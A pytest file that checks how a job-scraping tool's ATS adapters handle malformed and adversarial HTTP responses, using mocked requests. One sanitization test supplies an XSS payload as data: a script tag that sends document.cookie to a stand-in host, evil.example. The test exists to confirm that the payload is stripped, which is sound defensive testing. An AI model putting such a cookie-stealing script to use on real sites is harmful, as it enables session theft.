"""Hardening tests: malformed/adversarial real-world HTTP responses.

Uses `responses` to mock at the `requests` transport layer (so retry/backoff
logic runs for real, just without real sleeps) instead of hand-rolled fake
sessions. No test here makes a real network call.
"""

import requests
import responses

import pytest

from jobscout.sources import ats

GH_URL = "https://boards-api.greenhouse.io/v1/boards/{board}/jobs"
LEVER_URL = "https://api.lever.co/v0/postings/{board}"
WORKDAY_URL = "https://{host}/wday/cxs/{tenant}/{site}/jobs"


@pytest.fixture(autouse=True)
def no_real_sleep(monkeypatch):
    # Retry/backoff logic is real; we just don't want tests to actually wait.
    monkeypatch.setattr(ats.time, "sleep", lambda *_a, **_k: None)


# --------------------------------------------------------------------------
# Empty results
# --------------------------------------------------------------------------

@responses.activate
def test_greenhouse_empty_board():
    responses.add(responses.GET, GH_URL.format(board="empty"), json={"jobs": []})
    jobs = ats.fetch_greenhouse({"board": "empty", "name": "Empty Co"}, session=requests.Session())
    assert jobs == []


@responses.activate
def test_lever_empty_board():
    responses.add(responses.GET, LEVER_URL.format(board="empty"), json=[])
    jobs = ats.fetch_lever({"board": "empty", "name": "Empty Co"}, session=requests.Session())
    assert jobs == []


# --------------------------------------------------------------------------
# Dead slugs: 404 / 410
# --------------------------------------------------------------------------

@pytest.mark.parametrize("status", [404, 410])
@responses.activate
def test_greenhouse_dead_slug(status):
    responses.add(responses.GET, GH_URL.format(board="dead"), status=status)
    with pytest.raises(ats.AdapterError):
        ats.fetch_greenhouse({"board": "dead", "name": "Dead"}, session=requests.Session())


@pytest.mark.parametrize("status", [404, 410])
@responses.activate
def test_lever_dead_slug(status):
    responses.add(responses.GET, LEVER_URL.format(board="dead"), status=status)
    with pytest.raises(ats.AdapterError):
        ats.fetch_lever({"board": "dead", "name": "Dead"}, session=requests.Session())


# --------------------------------------------------------------------------
# 429 with Retry-After, and without it
# --------------------------------------------------------------------------

@responses.activate
def test_retries_429_respecting_retry_after_header():
    url = GH_URL.format(board="rate-limited")
    responses.add(responses.GET, url, status=429, headers={"Retry-After": "2"})
    responses.add(responses.GET, url, json={"jobs": []})
    jobs = ats.fetch_greenhouse({"board": "rate-limited", "name": "RL"}, session=requests.Session())
    assert jobs == []


@responses.activate
def test_retries_429_without_retry_after_header_using_backoff():
    url = GH_URL.format(board="rate-limited-no-header")
    responses.add(responses.GET, url, status=429)
    responses.add(responses.GET, url, json={"jobs": []})
    jobs = ats.fetch_greenhouse({"board": "rate-limited-no-header", "name": "RL"},
                                 session=requests.Session())
    assert jobs == []


# --------------------------------------------------------------------------
# 500/502/503/504 retried with backoff
# --------------------------------------------------------------------------

@pytest.mark.parametrize("status", [500, 502, 503, 504])
@responses.activate
def test_retries_server_errors_then_succeeds(status):
    url = LEVER_URL.format(board="flaky")
    responses.add(responses.GET, url, status=status)
    responses.add(responses.GET, url, status=status)
    responses.add(responses.GET, url, json=[])
    jobs = ats.fetch_lever({"board": "flaky", "name": "Flaky"}, session=requests.Session())
    assert jobs == []


@responses.activate
def test_gives_up_after_max_retries_and_surfaces_the_error():
    url = GH_URL.format(board="always-down")
    for _ in range(ats.MAX_RETRIES + 2):
        responses.add(responses.GET, url, status=503)
    with pytest.raises(requests.HTTPError):
        ats.fetch_greenhouse({"board": "always-down", "name": "Down"}, session=requests.Session())


# --------------------------------------------------------------------------
# Timeouts / connection resets propagate immediately, not retried
# --------------------------------------------------------------------------

@responses.activate
def test_timeout_propagates_without_retrying():
    url = GH_URL.format(board="timeout")
    responses.add(responses.GET, url, body=requests.exceptions.Timeout("timed out"))
    with pytest.raises(requests.exceptions.Timeout):
        ats.fetch_greenhouse({"board": "timeout", "name": "Timeout"}, session=requests.Session())
    assert len(responses.calls) == 1  # no retry attempted


@responses.activate
def test_connection_reset_propagates():
    url = LEVER_URL.format(board="reset")
    responses.add(responses.GET, url, body=requests.exceptions.ConnectionError("reset by peer"))
    with pytest.raises(requests.exceptions.ConnectionError):
        ats.fetch_lever({"board": "reset", "name": "Reset"}, session=requests.Session())


# --------------------------------------------------------------------------
# Invalid JSON / an HTML error page served with a 200
# --------------------------------------------------------------------------

@responses.activate
def test_html_error_page_with_200_status_raises_adapter_error():
    responses.add(responses.GET, GH_URL.format(board="htmlerror"),
                  body="<html><body>Service temporarily unavailable</body></html>",
                  status=200, content_type="text/html")
    with pytest.raises(ats.AdapterError):
        ats.fetch_greenhouse({"board": "htmlerror", "name": "HTML"}, session=requests.Session())


@responses.activate
def test_truncated_json_raises_adapter_error():
    responses.add(responses.GET, LEVER_URL.format(board="truncated"),
                  body='[{"id": "1", "text": "Data Engineer"', status=200,
                  content_type="application/json")
    with pytest.raises(ats.AdapterError):
        ats.fetch_lever({"board": "truncated", "name": "Truncated"}, session=requests.Session())


# --------------------------------------------------------------------------
# Missing / null fields
# --------------------------------------------------------------------------

@responses.activate
def test_greenhouse_null_location_and_title_and_content():
    responses.add(responses.GET, GH_URL.format(board="nullfields"), json={
        "jobs": [
            {"id": 1, "title": None, "location": None, "content": None,
             "absolute_url": None, "first_published": None, "updated_at": None},
        ]
    })
    jobs = ats.fetch_greenhouse({"board": "nullfields", "name": "Null"}, session=requests.Session())
    assert len(jobs) == 1
    j = jobs[0]
    assert j.title == ""
    assert j.location == ""
    assert j.description == ""
    assert j.url == ""
    assert j.posted_at is None


@responses.activate
def test_greenhouse_job_missing_id_is_skipped_not_crashed():
    responses.add(responses.GET, GH_URL.format(board="missingid"), json={
        "jobs": [
            {"title": "No ID Job"},
            {"id": 2, "title": "Has ID"},
        ]
    })
    jobs = ats.fetch_greenhouse({"board": "missingid", "name": "Missing"}, session=requests.Session())
    assert len(jobs) == 1
    assert jobs[0].title == "Has ID"


@responses.activate
def test_lever_null_categories_and_description():
    responses.add(responses.GET, LEVER_URL.format(board="nullfields"), json=[
        {"id": "1", "text": "Data Engineer", "categories": None, "description": None,
         "descriptionPlain": None, "lists": None, "hostedUrl": None, "createdAt": None},
    ])
    jobs = ats.fetch_lever({"board": "nullfields", "name": "Null"}, session=requests.Session())
    assert len(jobs) == 1
    assert jobs[0].location == ""
    assert jobs[0].description == ""
    assert jobs[0].posted_at is None


# --------------------------------------------------------------------------
# Unexpected extra fields are ignored, not fatal
# --------------------------------------------------------------------------

@responses.activate
def test_unexpected_extra_fields_are_ignored():
    responses.add(responses.GET, GH_URL.format(board="extra"), json={
        "jobs": [{"id": 1, "title": "Data Engineer", "location": {"name": "Remote"},
                  "something_brand_new": {"nested": ["data"]}, "another_future_field": 42}]
    })
    jobs = ats.fetch_greenhouse({"board": "extra", "name": "Extra"}, session=requests.Session())
    assert len(jobs) == 1
    assert jobs[0].title == "Data Engineer"


# --------------------------------------------------------------------------
# Unicode, emoji, RTL text, HTML entities, and script/style sanitization
# --------------------------------------------------------------------------

@responses.activate
def test_unicode_emoji_rtl_and_entities_survive():
    responses.add(responses.GET, GH_URL.format(board="unicode"), json={
        "jobs": [{
            "id": 1,
            "title": "Senior Data Engineer \U0001F680 (مهندس بیانات)",
            "location": {"name": "Bengaluru, กรุงเทพ"},
            "content": "<p>We use Python &amp; PySpark &lt;3. R&eacute;sum&eacute; required.</p>",
            "absolute_url": "https://example.com/job/1",
        }]
    })
    jobs = ats.fetch_greenhouse({"board": "unicode", "name": "Unicode"}, session=requests.Session())
    assert len(jobs) == 1
    assert "\U0001F680" in jobs[0].title
    assert "&amp;" not in jobs[0].description
    assert "Python & PySpark" in jobs[0].description
    assert "Résumé" in jobs[0].description


@responses.activate
def test_script_and_style_tags_are_sanitized_out():
    responses.add(responses.GET, GH_URL.format(board="xss"), json={
        "jobs": [{
            "id": 1, "title": "Data Engineer",
            "content": (
                "<style>.evil { color: red; }</style>"
                "<p>Real job description text.</p>"
                "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
            ),
        }]
    })
    jobs = ats.fetch_greenhouse({"board": "xss", "name": "XSS"}, session=requests.Session())
    description = jobs[0].description
    assert "Real job description text." in description
    assert "evil" not in description
    assert "fetch(" not in description
    assert "<script" not in description
    assert "<style" not in description


# --------------------------------------------------------------------------
# Very large job descriptions get capped
# --------------------------------------------------------------------------

@responses.activate
def test_very_large_description_is_capped():
    huge = "<p>" + ("word " * 60_000) + "</p>"  # well over 200KB
    responses.add(responses.GET, GH_URL.format(board="huge"), json={
        "jobs": [{"id": 1, "title": "Data Engineer", "content": huge}]
    })
    jobs = ats.fetch_greenhouse({"board": "huge", "name": "Huge"}, session=requests.Session())
    from jobscout.utils import MAX_DESCRIPTION_LENGTH
    assert len(jobs[0].description) <= MAX_DESCRIPTION_LENGTH


# --------------------------------------------------------------------------
# Duplicate job IDs
# --------------------------------------------------------------------------

@responses.activate
def test_greenhouse_duplicate_ids_in_one_response_deduped():
    responses.add(responses.GET, GH_URL.format(board="dupes"), json={
        "jobs": [
            {"id": 1, "title": "Data Engineer"},
            {"id": 1, "title": "Data Engineer (duplicate)"},
            {"id": 2, "title": "Other Role"},
        ]
    })
    jobs = ats.fetch_greenhouse({"board": "dupes", "name": "Dupes"}, session=requests.Session())
    assert len(jobs) == 2
    assert jobs[0].title == "Data Engineer"


@responses.activate
def test_smartrecruiters_duplicate_ids_across_pages_deduped():
    url = "https://api.smartrecruiters.com/v1/companies/dupeco/postings"
    page1 = {"totalFound": 2, "content": [{"id": "1", "name": "Data Engineer",
                                            "location": {"fullLocation": "Remote"}}]}
    responses.add(responses.GET, url, json=page1)
    responses.add(responses.GET, url, json=page1)  # API re-serves the same page
    jobs = ats.fetch_smartrecruiters({"company": "dupeco", "name": "DupeCo"},
                                      max_results=1, session=requests.Session())
    assert len(jobs) == 1


# --------------------------------------------------------------------------
# Relative vs absolute apply URLs (SuccessFactors scrape path)
# --------------------------------------------------------------------------

@responses.activate
def test_successfactors_relative_and_absolute_hrefs():
    html = """
    <table>
      <tr><td><a class="jobTitle-link" href="/job/relative-co/111/">Relative Job</a></td></tr>
      <tr><td><a class="jobTitle-link" href="https://career5.successfactors.com/job/absolute-co/222/">Absolute Job</a></td></tr>
    </table>
    """
    responses.add(responses.GET, "https://career5.successfactors.com/search/", body=html,
                  status=200, content_type="text/html")
    jobs = ats.fetch_successfactors({"host": "career5.successfactors.com", "name": "SF Co"},
                                     session=requests.Session())
    assert len(jobs) == 2
    assert jobs[0].url == "https://career5.successfactors.com/job/relative-co/111/"
    assert jobs[1].url == "https://career5.successfactors.com/job/absolute-co/222/"


# --------------------------------------------------------------------------
# Workday: tenant/site variations and redirects
# --------------------------------------------------------------------------

@responses.activate
def test_workday_wrong_site_returns_clear_404_error():
    url = WORKDAY_URL.format(host="acme.wd1.myworkdayjobs.com", tenant="acme", site="WrongSite")
    responses.add(responses.POST, url, status=404)
    with pytest.raises(ats.AdapterError, match="not found"):
        ats.fetch_workday({"host": "acme.wd1.myworkdayjobs.com", "tenant": "acme",
                            "site": "WrongSite", "name": "Acme"}, session=requests.Session())


@responses.activate
def test_workday_follows_redirect_to_canonical_host():
    # Workday sometimes redirects a legacy host to a renumbered one.
    old_url = WORKDAY_URL.format(host="acme.wd1.myworkdayjobs.com", tenant="acme", site="External")
    new_url = WORKDAY_URL.format(host="acme.wd5.myworkdayjobs.com", tenant="acme", site="External")
    responses.add(responses.POST, old_url, status=308,
                  headers={"Location": new_url})
    responses.add(responses.POST, new_url, json={"total": 1, "jobPostings": [
        {"title": "Data Engineer", "externalPath": "/job/1", "locationsText": "Remote"}
    ]})
    jobs = ats.fetch_workday({"host": "acme.wd1.myworkdayjobs.com", "tenant": "acme",
                               "site": "External", "name": "Acme"}, session=requests.Session())
    assert len(jobs) == 1


# --------------------------------------------------------------------------
# Dates in multiple formats, and missing dates
# --------------------------------------------------------------------------

@responses.activate
def test_dates_in_varied_formats_and_missing_pass_through_without_crashing():
    responses.add(responses.GET, GH_URL.format(board="dates"), json={
        "jobs": [
            {"id": 1, "title": "A", "first_published": "2026-01-15T10:00:00Z"},
            {"id": 2, "title": "B", "updated_at": "2026-01-15"},
            {"id": 3, "title": "C"},  # no date fields at all
        ]
    })
    jobs = ats.fetch_greenhouse({"board": "dates", "name": "Dates"}, session=requests.Session())
    assert jobs[0].posted_at == "2026-01-15T10:00:00Z"
    assert jobs[1].posted_at == "2026-01-15"
    assert jobs[2].posted_at is None
